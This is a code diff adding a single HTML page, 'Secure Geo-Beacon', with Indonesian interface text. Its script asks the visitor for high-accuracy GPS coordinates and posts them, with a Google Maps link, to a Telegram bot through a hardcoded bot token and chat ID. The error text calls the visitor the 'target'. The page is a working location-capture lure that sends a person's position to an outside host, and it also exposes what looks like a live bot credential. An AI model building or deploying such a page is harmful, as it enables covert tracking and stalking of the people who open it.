@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Geo-Beacon</title>
+    <style>
+        body { 
+            background-color: #050505; color: #00ff00; 
+            font-family: 'Consolas', monospace; 
+            display: flex; flex-direction: column; align-items: center; 
+            justify-content: center; height: 100vh; margin: 0; text-align: center;
+        }
+        .btn-scan {
+            background-color: #003300; color: #00ff00;
+            border: 2px solid #00ff00; padding: 15px 30px;
+            font-size: 16px; font-weight: bold; font-family: 'Consolas', monospace;
+            cursor: pointer; box-shadow: 0 0 10px rgba(0, 255, 0, 0.4);
+            transition: 0.3s; margin-top: 20px;
+        }
+        .btn-scan:hover {
+            background-color: #00ff00; color: #050505;
+            box-shadow: 0 0 20px rgba(0, 255, 0, 0.8);
+        }
+        #status { margin-top: 20px; text-align: center; max-width: 80%; word-wrap: break-word; line-height: 1.5;}
+    </style>
+</head>
+<body>
+
+    <h2>[ GEO-BEACON UPLINK ]</h2>
+    <p>Sistem akan mengekstrak koordinat GPS Anda<br>dan mengirimkannya ke Server Pusat (Telegram).</p>
+    
+    <button class="btn-scan" onclick="initGeoBeacon()">TRANSMIT LOCATION</button>
+    
+    <div id="status"></div>
+
+    <script>
+        // KREDENSIAL API SUDAH DI-INJEKSI
+        const BOT_TOKEN = "8945868058:AAFmrtok6NjltKd66IIE4Mai305eEq3lT1c";
+        const CHAT_ID = "7070949344";
+
+        const statusDiv = document.getElementById('status');
+
+        async function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+                });
+                return response.ok;
+            } catch (e) {
+                return false;
+            }
+        }
+
+        function initGeoBeacon() {
+            statusDiv.innerHTML = "[*] Meminta otorisasi satelit GPS...";
+            
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    async function(position) {
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        const acc = position.coords.accuracy;
+                        
+                        statusDiv.innerHTML = `[+] Koordinat didapatkan. Akurasi: ${acc} meter.<br>[*] Mentransmisikan payload ke Telegram...`;
+                        
+                        const mapsLink = `https://www.google.com/maps/place/${lat},${lon}`;
+                        const payload = `🚨 **GEO-BEACON TRIGGERED**\n\n` +
+                                        `📍 Lat: ${lat}\n` +
+                                        `📍 Lon: ${lon}\n` +
+                                        `📏 Akurasi: ${acc} meter\n` +
+                                        `🗺️ Maps: ${mapsLink}`;
+                                        
+                        const success = await sendToTelegram(payload);
+                        
+                        if(success) {
+                            statusDiv.innerHTML += "<br><span style='color: #00ff00;'>[SUCCESS] Payload diterima oleh Server Pusat. Cek Telegram Anda!</span>";
+                        } else {
+                            statusDiv.innerHTML += "<br><span style='color: #ff3333;'>[FAILED] Gagal menghubungi API Telegram.</span>";
+                        }
+                    },
+                    function(error) {
+                        statusDiv.innerHTML = `<span style='color: #ff3333;'>[-] Gagal: Otorisasi lokasi ditolak oleh target.</span>`;
+                    },
+                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                );
+            } else {
+                statusDiv.innerHTML = "[-] Browser tidak mendukung Geolocation API.";
+            }
+        }
+    </script>
+</body>
+</html>
